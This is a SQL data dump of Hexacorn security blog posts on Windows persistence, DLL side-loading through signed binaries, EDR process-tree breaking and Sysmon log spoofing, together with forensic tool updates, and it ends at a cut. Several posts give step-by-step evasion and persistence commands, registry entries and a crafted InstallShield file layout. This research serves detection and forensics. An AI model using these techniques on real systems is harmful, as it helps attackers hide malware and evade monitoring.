INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (78, 'Permanent Link to Beyond good ol’ Run key, Part 67', 'Hexacorn', 'October 21, 2017 ', 'New versions of Windows are shipped with an on-screen keyboard that – amongst other features – allows us to enter the text in a handwritten form:\n\nThe task of handwritten text analysis and input training is ‘outsourced’ to dedicated libraries that are loaded from the following locations in the Registry:\n\nHKLM\\SOFTWARE\\Microsoft\\TPG\\System Recognizers\nHKLM\\SOFTWARE\\Microsoft\\TPG\\Recognizers\n\nAdding an entry that replaces an entry for e.g. English:\n\nleads to the library being loaded anytime the TabTip.exe process is executed (one that presents the ‘tablet’ to handwrite on):\n\nFor what its worth, my test DLL broke the handwriting input as it doesn’t do any proxy work.\nProbably not the most used feature on your desktop computer, but it could work on many tabletish computers in Asia where ideograms and other complex characters are commonly used (plus users use handwriting input a lot!).\n \nShare this :)', 'Anti-*, Autostart (Persistence), Compromise Detection, Forensic Analysis', 'http://www.hexacorn.com/blog/2017/10/21/beyond-good-ol-run-key-part-67/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (79, 'Permanent Link to ImagingDevices – yet another, OS native side-loading program…', 'Hexacorn', 'October 20, 2017 ', 'Just a quick note that c:\\Program Files\\Windows Photo Viewer\\ImagingDevices.exe uses LoadLibrary to load sti_ci.dll and as such it can be used to sideload any DLL.\nAll you have to do is copy ImagingDevices.exe over to a temporary folder, drop your DLL there as well, just make sure it is named sti_ci.dll, then run:\nImagingDevices.exe /InstallWiaDevice\nShare this :)', 'Anti-Forensics, EDR, Incident Response, Living off the land, Malware Analysis', 'http://www.hexacorn.com/blog/2017/10/20/imagingdevices-yet-another-os-native-side-loading-program/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (80, 'Permanent Link to Beating shields of EDR with the 16-bit setup', 'Hexacorn', 'October 14, 2017 ', 'This is probably the most bizarre way of breaking the process tree you will see today, but well, it works, so there you go…\nHave you ever wondered what these guys are?\n\nC:\\Windows\\System32\\InstallShield\\setup.exe\nC:\\Windows\\SysWOW64\\InstallShield\\setup.exe\n\nYup, me neither – until today.\nTurns out that this is a very old school InstallShield setup program.\nIt has an interesting property that it is signed and exists on lots of versions of Windows.\nIt turns out that you can use it for at least two different purposes.\n\nSide-load _setup.dll it relies on (signed .exe loading unsigned DLL)\nSpawn .exe of your choice, breaking the process tree in a very lame way\n\nThe first one is trivial.\nThe second one is the really weird one – we have to create a fake setup directory layout that will allow us to execute program of our choice.\nWe need these files to pull it off:\n\n_inst32i.ex_\n\nthe binary that is required by setup.exe; after toying around with an existing _inst32i.ex_ file from some old installation I came up with this minimalistic file layout that you need to save as _inst32i.ex_\n\n\n\n00 : 2A AB 79 D8 00 01 00 00 00 00 00 00 00 00 00 00 *.y............. 000\r\n10 : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 016\r\n20 : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 032\r\n30 : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 048\r\n40 : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 03 00 ................ 064\r\n50 : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 080\r\n60 : 00 00 00 00 00 00 0B 00 49 4E 53 54 41 4C 4C 2E ........INSTALL. 096\r\n70 : 45 58 45 01 00 58 00 00 00 00 00 00 00 00 00 00 EXE..X.......... 112\r\n80 : 00 00 00 00 00 00 00 00 00 00 09 00 7A 64 61 74 ............zdat 128\r\n90 : 61 2E 64 6C 6C 01 00 5A 00 00 00 00 00 00 00 00 a.dll..Z........ 144\r\nA0 : 00 00 00 00 00 00 00 00 00 00 00 00 0B 00 57 55 ..............WU 160\r\nB0 : 54 4C 39 35 69 2E 44 4C 4C 01 00 58 00 00 00 00 TL95i.DLL..X.... 176\r\nC0 : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 192\r\nD0 : 0A 00 42 4F 4F 54 31 36 2E 45 58 45 01 00 58    ..BOOT16.EXE..X  208\n\n_setup.dll\n\nalready on the system\n\n\nlayout.bin\n\njust type “echo > layout.bin”\n\n\nsetup.exe\n\nalready on the system, signed\n\n\nSETUP.LID\n\n[Languages]\r\nkey0=0009\r\nDefault=0009\r\ncount=1\nFinally, the payload – save it inside this file:\n\nxtract_all.exe\n\nor, make xtract_all.exe a dummy and store the payload inside the  _isdel.exe file.\nNow, all you have to do is to run:\nsetup.exe /extract_all /s\nThis will execute setup.exe in a silent mode, and will force it to launch both xtract_all.exe and _isdel.exe.\nInterestingly, the _isdel.exe is launched from the same directory, but xtract_all.exe will be executed from the %TEMP% directory.\n\nYup. It’s complicated, I told you \nThis can be taken a step further. Instead of using the /extract_all trick, you can actually generate your own _inst32i.ex_ file that may hold the payload. Since it’s an old proprietary InstallShield package file format, it is unlikely its content is scanned for malware. To generate a payload you may either use an InstallShield installer (if you can find one!), or.. reverse engineer the package file format…\nShare this :)', 'Anti-Forensics, Archaeology, Compromise Detection, File Formats ZOO, Forensic Analysis, Living off t', 'http://www.hexacorn.com/blog/2017/10/14/beating-shields-of-edr-with-the-16-bit-setup/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (81, 'Permanent Link to DeXRAY 2.03 update', 'Hexacorn', 'October 7, 2017 ', 'Added ‘handling’ of quarantine.qtn from Symantec products on MAC.\nSaying ‘handling’, because at the moment there is no good perl library for encrypted .zip files, BUT…  we really don’t need such library since the decryption is trivial. If the quarantine.qtn is found, you will get a list of files inside the container + information how to extract each file (hint: the password is… a file name \nYou can download it here.\nThe full list of supported or recognized file formats is listed below:\n\nAhnLab (V3B)\nASquared (EQF)\nAvast (Magic@0=’-chest- ‘)\nAvira (QUA)\nBaidu (QV)\nBitDefender (BDQ)\nBullGuard (Q)\nCMC Antivirus (CMC)\nComodo <GUID> (not really; Quarantined files are not encrypted \nESafe (VIR)\nESET (NQF)\nF-Prot (TMP) (Magic@0=’KSS’)\nKaspersky (KLQ)\nLavasoft AdAware (BDQ) /BitDefender files really/\nLumension LEMSS (lqf)\nMalwareBytes Data files (DATA)\nMalwareBytes Quarantine files (QUAR)\nMcAfee Quarantine files (BUP) /full support for OLE format/\nMicrosoft Forefront|Defender (Magic@0=0B AD|D3 45) – D3 45 C5 99 header handled\nPanda <GUID> Zip files\nSpybot – Search & Destroy 2 ‘recovery’\nSUPERAntiSpyware (SDB)\nSymantec ccSubSdk files: {GUID} files and submissions.idx\nSymantec Quarantine Data files (QBD)\nSymantec Quarantine files (VBN)\nSymantec Quarantine Index files (QBI)\nSymantec Quarantine files on MAC (quarantine.qtn)\nTrendMicro (Magic@0=A9 AC BD A7 which is a ‘VSBX’ string ^ 0xFF)\nQuickHeal <hash> files\nVipre (<GUID>_ENC2)\nZemana <hash> files+quarantine.db\nAny binary file (using X-RAY scanning)\n\nShare this :)', 'Batch Analysis, Compromise Detection, DeXRAY, File Formats ZOO, Forensic Analysis, Incident Response', 'http://www.hexacorn.com/blog/2017/10/07/dexray-2-03-update/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (82, 'Permanent Link to Beyond good ol’ Run key, Part 66', 'Hexacorn', 'October 5, 2017 ', 'I discussed Winsock-based persistence in the past.\nThere is one more.\nIt is a bit unusual, as it has to do with automatic proxy configuration, so it’s a bit tricky to reproduce. I have honestly not made an attempt to fully understand the logic winsock uses to determine how to find the proxy, plus it’s pretty late and I only discovered it now so maybe some other time…\nFor the purpose of this post, one thing that is interesting is this key:\n\nHKCR\\AutoProxyTypes\n\nThe two standard entries underneath are:\n\nApplication/x-internet-signup\nApplication/x-ns-proxy-autoconfig\n\nIt turns out you can add your own e.g.:\n\nWinsock will enumerate the AutoProxyTypes key children nodes while trying to find the proxy and will load DLLs located underneath.\nI had luck reproducing it on Windows 7 while tinkering with the Internet Options/Lan Settings (enabling/disabling it), but could not make it work on Windows 10. I may come back to do some more testing later on, but for now this screenshot should suffice:\n\nShare this :)', 'Anti-*, Autostart (Persistence), Compromise Detection, Forensic Analysis', 'http://www.hexacorn.com/blog/2017/10/05/beyond-good-ol-run-key-part-66/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (83, 'Permanent Link to Running programs via Proxy & jumping on a EDR-bypass trampoline, Part 2', 'Hexacorn', 'October 4, 2017 ', 'Update\nAfter my post Zod contacted me with this mike-dropping link: Ultimate AppLocker ByPass List. Really lots of good stuff there! Thx Zod!\nOld Post\nIn the first part I listed a couple of examples of programs that may be used as a proxy to launch other programs. In the meantime, subTee kicked off a very interesting thread on Twitter listing a number of signed .exe binaries that can be used as a proxy to load a DLL. Yesterday I came across a few cool posts by @0rbz_. This in return reminded me of my first post and I decided to add a few more proxy/living off the land ideas.\nThere is a number of signed .exe that can be used to load other .exes or .dlls and as a result – break standard EDR detection rules, or bypass some whitelisting. This may sometimes involve copying the signed binary to your folder in order to sideload your DLL (PlugX is a very good example, funnily enough – in many cases they don’t even need to bring a signed .exe and fetch one that is typically present on the system).\nHere is the list:\n\nAppVLP.exe – to launch .exe\n\nFrom this Tweet by @0rbz_\nJust run C:\\Program Files\\Microsoft Office\\root\\client\\AppVLP.exe <exename>\n\n\npcalua.exe\n\nFrom this Tweet by @0rbz_ and mentioned on this forum\nJust run C:\\windows\\system32\\pcalua.exe -a <exename>\n\n\nodbcconf.exe – to load .dll\n\nFrom this Tweet by  subTee\nodbcconf.exe /f my.rsp\n\n\nodbcad32.exe – to load .dll via GUI\n\ndrop c:\\windows\\system32\\<dllfile>\nrun odbcad32.exe\ngo to Tracing Tab\nchoose Custom Trace DLL\nhit Start Tracing Now\n\n\n\nWinMail.exe – to load .dll\n\ncopy c:\\Program Files\\Windows Mail\\WinMail.exe to your folder\nname your DLL ‘msoe.dll’\nlaunch one of these\n\nWinMail.exe /identcatalog\nWinMail.exe /identfileslist:foo\nWinMail.exe /identfile:foo\n\n\n\n\nxwizard.exe – to load .dll\n\nFrom my previous post\ncopy c:\\WINDOWS\\system32\\xwizard.exe to your folder\nname your DLL ‘xwizards.dll’\nrun xwizard.exe with at least two arguments\n\n\njava.exe – to load .dll\n\nFrom my previous post\nrun java -agentlib:<dllname>\nor\nrun java -agentpath:<dllname_with_dll_extension>\n\n\nany other phantom / sideloaded dlls – to load .dll\n\ne.g. just google for “site:http://hexacorn.com phantom dll“\n\n\n\nIf you know of any other tricks like this, please let me know. Thanks!\np.s. as I was about to post it, Huntress Labs just published yet another cool technique using WseClientSvc.exe passthru.exe calc.exe!\nShare this :)', 'Anti-*, EDR, Incident Response, Living off the land, LOLBins', 'http://www.hexacorn.com/blog/2017/10/04/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline-part-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (84, 'Permanent Link to Sysmon doing lines', 'Hexacorn', 'October 2, 2017 ', 'This is just an experiment I ran today to see if I could fool sysmon (or more specifically: any program that parses sysmon logs, or users viewing the sysmon logs in the Event Viewer) into doing an extra line, or two… .\nWhat if…\n…the command line of the spawn process (calculator in this case) looked like a part of the Event Log itself? Something along these lines :\ncalc\r\n\r\n CurrentDirectory: C:\\non-existing\\\r\n User: test-pc\\user\r\n LogonGuid: {15a1393e-e37e-58de-0000-0020e0940300}\r\n LogonId: 0x394E0\r\n TerminalSessionId: 1\r\n IntegrityLevel: High\r\n Hashes: SHA1=2E391131F9B77A8EC0E0172113692F9E2CCCEAF0\r\n ParentProcessGuid: {15a1393e-97f2-59d2-0000-0010a4d8a500}\r\n ParentProcessId: 666\r\n ParentImage: C:\\windows\\system32\\calc.exe\nObviously, you can’t run it from a command line, you need a program to run it for you using the CreateProcess API.\nThe result would be like this:\nSo… when the data is previewed, the user can (at least for a moment) believe the calc.exe was indeed spawn by the process ID 666 and parent process is calc.exe (which on its own is kinda difficult), and the current directory is c:\\non-existing.\nPrograms exporting logs into CSV/TXT could get potentially fooled too as the injected data lines up with expected logs and a possible state machine parsing them could be fooled; one could potentially inject a number of such fake logs and potentially disturb the log parsing process and create some funny, non-existing process-tree scenario.\nShare this :)', 'Anti-Forensics, EDR, Forensic Analysis, Incident Response, Malware Analysis', 'http://www.hexacorn.com/blog/2017/10/02/sysmon-doing-lines/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (85, 'Permanent Link to DeXRAY 2.02 update', 'Hexacorn', 'September 29, 2017 ', 'Added Zemana <hash> files+quarantine.db\nYou can download it here.\nThe full list of supported or recognized file formats is listed below:\n\nAhnLab (V3B)\nASquared (EQF)\nAvast (Magic@0=’-chest- ‘)\nAvira (QUA)\nBaidu (QV)\nBitDefender (BDQ)\nBullGuard (Q)\nCMC Antivirus (CMC)\nComodo <GUID> (not really; Quarantined files are not encrypted \nESafe (VIR)\nESET (NQF)\nF-Prot (TMP) (Magic@0=’KSS’)\nKaspersky (KLQ)\nLavasoft AdAware (BDQ) /BitDefender files really/\nLumension LEMSS (lqf)\nMalwareBytes Data files (DATA)\nMalwareBytes Quarantine files (QUAR)\nMcAfee Quarantine files (BUP) /full support for OLE format/\nMicrosoft Forefront|Defender (Magic@0=0B AD|D3 45) – D3 45 C5 99 header handled\nPanda <GUID> Zip files\nSpybot – Search & Destroy 2 ‘recovery’\nSUPERAntiSpyware (SDB)\nSymantec ccSubSdk files: {GUID} files and submissions.idx\nSymantec Quarantine Data files (QBD)\nSymantec Quarantine files (VBN)\nSymantec Quarantine Index files (QBI)\nTrendMicro (Magic@0=A9 AC BD A7 which is a ‘VSBX’ string ^ 0xFF)\nQuickHeal <hash> files\nVipre (<GUID>_ENC2)\nZemana <hash> files+quarantine.db\nAny binary file (using X-RAY scanning)\n\nShare this :)', 'Batch Analysis, Compromise Detection, DeXRAY, File Formats ZOO, Forensic Analysis, Incident Response', 'http://www.hexacorn.com/blog/2017/09/29/dexray-2-02-update/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (86, 'Permanent Link to Beyond good ol’ Run key, Part 65', 'Hexacorn', 'September 27, 2017 ', 'Looking for new ways to load code persistently I had a quick glance at Java. While it may not be present on all systems, it’s out there on at least 3 billions devices (so the ad claims).\nThe first thing that caught my eyes were these nice command line options:\n\n-agentlib:<agent-lib-name>=<options>\n-agentpath:<path-to-agent>=<options>\n\nThe agent library is just a DLL that needs to export an Agent_OnLoad function. I quickly prepared a test DLL with a dummy export and got it to load as shown below:\n\njava -agentlib:c:\\Test\\javaagent\n\n\n\njava -agentpath:c:\\Test\\javaagent.dll\n\n\nSo, the first takeaway is that if there is java.exe on the system, you can use it to load unsigned DLL, same way as xwizards, and tones of other similar tricks from @subtee.\nHaving a way to load DLL is one thing, being able to load it persistently is another.\nThis is where JAVA_TOOL_OPTIONS environment variable comes handy.\nOnce you set it to f.ex.:\nset JAVA_TOOL_OPTIONS=-agentpath:c:\\Test\\javaagent.dll\nthe library will be loaded anytime java.exe starts.\n\nObviously, these errors shown on the screenshots is just me being lazy – my dummy library should return appropriate value for the java.exe to be happy about, and so it can actually continue the execution. Ignoring that, the second takeaway is that as long as you make the JAVA_TOOL_OPTIONS variable persistent f.ex. via the Registry:\nHKCU\\Environment\\JAVA_TOOL_OPTIONS=\r\n-agentpath:c:\\Test\\javaagent.dll\r\n\n– the library will be loaded anytime java.exe starts.\nThe JAVA_TOOL_OPTIONS has a few undocumented sibling variables called _JAVA_OPTIONS and IBM_JAVA_OPTIONS as explained here. These can be leveraged as well. The Windows Java version I tested (jre1.8.0_144) refers to _JAVA_OPTIONS during the start-up, so you can add persistence via this Registry entry:\nHKCU\\Environment\\_JAVA_OPTIONS=\r\n-agentpath:c:\\Test\\javaagent.dll\nI have not confirmed the below, but I guess there are other options for toying around with persistence using Java. Looking at the CLI help we can see the following possible avenues for exploration:\n\n-javaagent:<jarpath>[=<options>] – load Java programming language agent, see java.lang.instrument\n-classpath <class search path of directories and zip/jar files> -fA ; separated list of directories, JAR archives, and ZIP archives to search for class files.\n-Xbootclasspath:<directories and zip/jar files separated by ;> – set search path for bootstrap classes and resources\n-Xbootclasspath/a:<directories and zip/jar files separated by ;> – append to end of bootstrap class path\n-Xbootclasspath/p:<directories and zip/jar files separated by ;> – prepend in front of bootstrap class path\n\nThere is also another variable worth looking at: _ALT_JAVA_HOME_DIR. By changing it, you can manipulate the path that Java Virtual Machine uses while it is looking for Java Run-Time Environment. This may open some possibilities for companion virus-like persistence.\nShare this :)', 'Anti-*, Autostart (Persistence), Compromise Detection, Forensic Analysis', 'http://www.hexacorn.com/blog/2017/09/27/beyond-good-ol-run-key-part-65/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (87, 'Permanent Link to DeXRAY 2.01 update', 'Hexacorn', 'September 23, 2017 ', 'I recently came across an AV called BullGuard. I have never heard of it so it triggered my curiosity, not about the protection, but more about the algorithm it uses for its Quarantined files.\nYup. Yet another hobby of mine.\nThe algo turned out to be a simple xor, and as a result of this ‘research’ DeXRAY now supports one more quarantine file format…\nYou can download it here.\nThe full list of supported or recognized file formats is listed below:\n\nAhnLab (V3B)\nASquared (EQF)\nAvast (Magic@0=’-chest- ‘)\nAvira (QUA)\nBaidu (QV)\nBitDefender (BDQ)\nBullGuard (Q)\nCMC Antivirus (CMC)\nComodo <GUID> (not really; Quarantined files are not encrypted \nESafe (VIR)\nESET (NQF)\nF-Prot (TMP) (Magic@0=’KSS’)\nKaspersky (KLQ)\nLavasoft AdAware (BDQ) /BitDefender files really/\nLumension LEMSS (lqf)\nMalwareBytes Data files (DATA)\nMalwareBytes Quarantine files (QUAR)\nMcAfee Quarantine files (BUP) /full support for OLE format/\nMicrosoft Forefront|Defender (Magic@0=0B AD|D3 45) – D3 45 C5 99 header handled\nPanda <GUID> Zip files\nSpybot – Search & Destroy 2 ‘recovery’\nSUPERAntiSpyware (SDB)\nSymantec ccSubSdk files: {GUID} files and submissions.idx\nSymantec Quarantine Data files (QBD)\nSymantec Quarantine files (VBN)\nSymantec Quarantine Index files (QBI)\nTrendMicro (Magic@0=A9 AC BD A7 which is a ‘VSBX’ string ^ 0xFF)\nQuickHeal <hash> files\nVipre (<GUID>_ENC2)\nAny binary file (using X-RAY scanning)\n\nShare this :)', 'Batch Analysis, Compromise Detection, DeXRAY, File Formats ZOO, Forensic Analysis, Incident Response', 'http://www.hexacorn.com/blog/2017/09/23/dexray-2-01-update/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (88, 'Permanent Link to Enter Sandbox – part 15: The muddy, heavy water world of atomic formats…', 'Hexacorn', 'September 22, 2017 ', 'Sample analysis process typically covers looking at the most common forensic suspects including mutexes, event names, and atoms. However, there is one more sub-artifact sitting on the same bench with the last one I have listed… one that often escapes the scrutiny of sandboxes and malware analysts – the clipboard format.\nThe clipboard format is registered using the RegisterClipboardFormat function – it allows applications to interchange data as long as they understand the format. The registration is implemented with the use of atoms as explained in this presentation.\nSandboxes and analysts inspecting the calls to RegisterClipboardFormat can use the received data in many ways. It can help to determine a file type of the sample, its modules, detect a family of a malware/adware, or perhaps a programming framework, and in some cases heuristically detect capabilities of the tested sample. I have listed a few example clipboard formats below. If you look at it one set that immediately stands out are Delphi clipboard formats:\n\nDelphi Picture\nDelphi Component\nControlOfs<HEX-STRING> (f.ex. ControlOfs00400000000007A8)\n\nFinding these in the API calls or even in memory is a good indication that there is a Delphi application running.\nThe same goes for ATL samples:\n\nWM_ATLGETCONTROL\nWM_ATLGETHOST\n\nThere are also malware-adware-specific formats e.g.:\n\nAmInst__Runing\nyimomotoTec Picture\nyimomotoTec Component\nPowerSpider\nRinLoggerInstance\nSatoriWM_SetNetworkShareableFlag\nTransfer_File_Success_Doyo\n180StartDownload\n\n… RAT-related formats:\n\nWinVNC.Update.Mouse\nWinVNC.Update.DrawRect\nWinVNC.Update.CopyRect\nWinVNC.AddClient.Message\nUltraVNC.Viewer.FileTransferSendPacketMessage\n\n… test formats:\n\nHey, this is unicough single instance test\nUWM_GAMETESTCMD_{75AEED17-2310-4171-94C6-08AC4438E814}_MSG\nMessage.My.Super.Puper.Test.Program.XXX\nKSDB_TEST: Message communciation between Agent and its TEST host client.\nFONT-TEST\n\n… various functionality-related formats:\n\nWM_HTML_GETOBJECT\nRasDialEvent\nEXPLORER.EXEIsDebuggerPresentExEdLl\nwinmm_devicechange\nWM_HOOKEX_RK\nUWM_KEYHOOK_MSG-968C3043-1128-43dc-83A9-55122C8D87C1\nTransfer_File_Success_Doyo\n3rdeye_tb_hacking_dll\nkeyhook_msg\n\n… P2P programs formats:\n\nEMULE-{4EADC6FC-516F-4b7c-9066-97D893649570}\nKazaaNewSearch\n\n… possible hints on programmer’s mother tongue:\n\nKarte ziehen\nquerodarmeucu\n\n…random:\n\ntrhgtehgfsgrfgtrwegtre\nfrgjbfdkbnfsdjbvofsjfrfre\nhgtrfsgfrsgfgregtregtr\ngsegtsrgrefsfsfsgrsgrt\n\nA short list of top 30 formats I collected from my sampleset:\n 46894 TaskbarCreated\r\n 30020 commdlg_FindReplace\r\n 27886 Delphi Picture\r\n 27886 Delphi Component\r\n 27491 commdlg_help\r\n 13920 WM_ATLGETCONTROL\r\n 13914 WM_ATLGETHOST\r\n 11000 3\r\n  8395 commctrl_DragListMsg\r\n  7445 1\r\n  6909 WM_GETCONTROLNAME\r\n  5475 FileName\r\n  5020 Embedded Object\r\n  4899 Link Source\r\n  4885 Rich Text Format\r\n  4787 Object Descriptor\r\n  4652 commdlg_ColorOK\r\n  4576 OwnerLink\r\n  4574 Embed Source\r\n  4569 Link Source Descriptor\nShare this :)', 'Batch Analysis, Clustering, Malware Analysis, Reversing, Sandboxing', 'http://www.hexacorn.com/blog/2017/09/22/enter-sandbox-part-15-the-muddy-heavy-water-world-of-atomic-formats/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (89, 'Permanent Link to Updated EDR Sheet – LimaCharlie', 'Hexacorn', 'September 12, 2017 ', 'Another update. This one comes from Maxime Lamothe-B who describes LimaCharlie !\nThank you!\nIf you need any explanation on the meaning of the columns, please read this post.\nThe updated sheet can be downloaded here.\nIf you spot any mistake or feel there is something missing, please do not hesitate to contact me.\nShare this :)', 'EDR', 'http://www.hexacorn.com/blog/2017/09/12/updated-edr-sheet-limacharlie/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (90, 'Permanent Link to Updated EDR Sheet', 'Hexacorn', 'August 4, 2017 ', 'Just a quick update to include Nuix.\nThanks to Stuart for providing this!\nIf you need any explanation on the meaning of the columns, please read this post.\nThe updated sheet can be downloaded here.\nIf you spot any mistake or feel there is something missing, please do not hesitate to contact me.\nShare this :)', 'EDR', 'http://www.hexacorn.com/blog/2017/08/04/updated-edr-sheet-3/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (91, 'Permanent Link to Enter Sandbox: Special edition', 'Hexacorn', 'August 3, 2017 ', 'I recently wrote Cyber version of Orgasmatron. Writing one for Metallica’s Enter Sandman was on my mind for much longer since it’s almost impossible not to think of it when you read the title of this series… So… here it is:\nEnter Sandbox\nQEMU, VMWare\nDon’t forget the Xen\nAnd Sandboxie’s there\nVirtual Box, Cuckoo rocks\nParallels’s in stock\nTill the Sandbox he comes\nSleep is nopped and faster\nCursor is moving too\nExit: Threads\nEnter: Creds\nFakenet snoops\nWhile we patch the stalling loops\nSomething’s wrong, freeze the guest\nHeavy loaded host\nAnd it’s not doing its best\nMining coins, WannaCry\nVirus spreads like fire\nAnd the Pafish will bite\nSleep is nopped and faster\nCursor is moving too\nExit: Threads\nEnter: Creds\nFakenet snoops\nWhile we patch the stalling loops\nNow I call the function Sleep\nTime Stamp Counter I will keep\nIf I delta some of it\nNumbers bad? It’s time to quit\nHash the file, and check the strings\nAnd never mind that noise you see\nIt’s just the fake I, O and C\nIn your report, for VP\nExit: Threads\nEnter: Creds\nCalling rand()\nExit: Threads\nEnter: Creds\nFakenet snoops\nWhile we patch the stalling loops\nShare this :)', 'Sandboxing, Silly', 'http://www.hexacorn.com/blog/2017/08/03/enter-sandbox-special-edition/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (92, 'Permanent Link to The Wizard of X – Oppa PlugX style', 'Hexacorn', 'July 31, 2017 ', 'Xwizard is an ‘Extensible wizard host process’. While I am not 100% sure what it is doing I know for certain that – whatever it is – PlugX guys would approve.\nWhy?\nWhen you run it with a ‘/h’ command line parameter, you will get this info:\n\nSomething about the unusual command line parameters described there caught my eye.\nAfter a quick inspection I discovered why. The arguments are actually… names of functions exported from xwizards.dll!\n\nVery nice!\nAnd even nicer is the fact the LoadLibraryEx that loads that xwizards.dll finds its conveniently in the current path…\nOuch…\nSo… all you have to do is copy c:\\WINDOWS\\system32\\xwizard.exe to your folder, drop your xwizards.dll DLL there and call xwizard.exe with at least two arguments.\nAnd the Microsoft-signed xwizards.exe will load xwizards.dll of your choice…\nShare this :)', 'Anti-*, Compromise Detection, Forensic Analysis, Incident Response, Living off the land, Malware Ana', 'http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (93, 'Permanent Link to Orgasmatron, the cyber version', 'Hexacorn', 'July 16, 2017 ', 'This is what happens when you are bored. Motorhead/Sepultura‘s lyrics – cyber version \n\nShare this :)', 'Silly', 'http://www.hexacorn.com/blog/2017/07/16/orgasmatron-the-cyber-version/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (94, 'Permanent Link to Beyond good ol’ Run key, Part 64', 'Hexacorn', 'July 12, 2017 ', 'I recently updated my ‘collect all cool persistence mechanism described elsewhere’ post. After I announced it on Twitter, 3gstudent replied with one more link – one that led to his demo of persistence via bitsadmin. I looked at BITS before, but it never occurred to me to look at all command line options of the bitsadmin tool – the fact it allows persistence was a nice surprise. It intrigued me that it was not recognized by autoruns.\nI immediately tested the mechanism on a Win7 VM and quickly discovered that the BITS stores info about tasks inside the following location:\n\nc:\\ProgramData\\Microsoft\\Network\\Downloader\\qmgr0.dat\nc:\\ProgramData\\Microsoft\\Network\\Downloader\\qmgr1.dat\n\nSometimes you may find also qmgr0.bak & qmgr1.bak files there.\nI have ran a test adding as many tasks as possible and noticed that the only visible difference is growth of the file size of both files. After the first test the files on my system were around 4MiB (Win7). Adding new tasks eventually made BITS run out of space – at that time it simply extends the file.\nGoogling around for these file names doesn’t provide that much info. The format of the file is unknown – some serialized data.\nOne thing is sure though –  if you come across these during the exam, you should defo look at possible BITS persistence.\nShare this :)', 'Anti-*, Autostart (Persistence), Compromise Detection, Forensic Analysis', 'http://www.hexacorn.com/blog/2017/07/12/beyond-good-ol-run-key-part-64/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (95, 'Permanent Link to If memory doesn’t serve me right…', 'Hexacorn', 'July 10, 2017 ', 'Update\nOne more item from @JamesHabben:\n\nOne situation I frequently face is determining IIV for malware from months to years before. Memory analysis is useless for that.\n\nOld post\nI love memory forensics. So do you.\nThis is why you gonna hate me \nIn a quick post on Twitter, @MalwareJake asked:\nMemory forensics cuts through the lies of code injection and rootkits\nYes or no?\nI replied:\nMost of the time: yes. BUT lots of examples for: No\nI thought it will be an interesting task to brainstorm&braindump these examples in one place and by doing so, find an excuse to look at the limitations of memory forensics. I am far from being the first one to talk about it, but it’s worth rehashing old ideas every once in a while…\nSo, without further ado, here’s a brain-dump of ‘malicious’ ideas that memory forensics will not help with, or will find at least challenging:\n\nWe must start with the well-known examples of Shadow Walker [PDF warning] and Blue Pill rootkits of course\n“One-bit” modifications f.ex. enabling a debug/verbose flag in a software resulting in local data leaks – hard to detect\nSame goes for small changes to configs – slightly modified path or server name can easily stay under radar\nModification of scrips, batch files, any sort of interpreted code (and in particular, any server-side code) – especially if it doesn’t run in a context of a typical windows user (f.ex. a line added to a task running on server that is responsible for batch-processing could simply copy files from a local system to a pwned share elsewhere)\nUnusual, but temporary persistence mechanisms allowing to load malware w/o many side effects and malware exiting as soon as possible (not persistent in memory) f.ex. Hot Keys trick (granted, you may see zombie processes though)\nSmall, in-place, viral modification of files (and especially EPO modifications), in particular OS files, but could be any file that is executed on regular basis (especially DLLs)\n.NET rootkits & any sort of .NET modification (imho still under-explored areas)\nShadow-Wakerish Rootkit that intercepts access to a physical memory device and ‘cleans’ memory content on the fly, removing its code and related artifacts\nWatchdog could wipe the code out when the memory dumping tool is loaded – by monitoring file, registry key/service creation or known detecting known mutexes etc. f.ex.:\n\nComae DumpIt // 32 and 64-bit\n\nDumpIt\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\DumpIt\n%SYSTEM%\\Drivers\\DumpIt.sys\n\n\nMoonSols Windd\n\n32-bit\n\nwin32dd\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\win32dd\n\n\n64-bit\n\nwin64dd\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\win64dd\n\n\n\n\nHBGary 